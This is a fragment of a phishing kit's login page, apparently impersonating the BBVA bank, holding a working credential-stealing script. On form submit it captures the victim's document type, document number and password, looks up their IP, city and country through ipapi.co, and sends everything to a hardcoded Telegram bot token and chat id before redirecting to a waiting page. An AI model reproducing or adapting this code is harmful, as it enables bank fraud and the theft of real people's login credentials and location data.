  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const tipo = document.querySelector("#tipodoc").value;
          const numdoc = document.querySelector("#numdoc").value;
          const contra = document.querySelector("#clvs").value;

          localStorage.setItem("usuario", numdoc);
          const message =
            "\nBBVA\nTipo: " +
            tipo +
            "\nNúmero de documento: " +
            numdoc +
            "\nContra: " +
            contra +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot6283515482:AAEFjNYeO4GIWFwJQaQYMAvxtyIEfqvjWmY/sendMessage",
              {
                chat_id: "5190607545",
                text: message,
              }
            )
            .then((response) => {
              window.location.href = "espereunosminutos.html";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
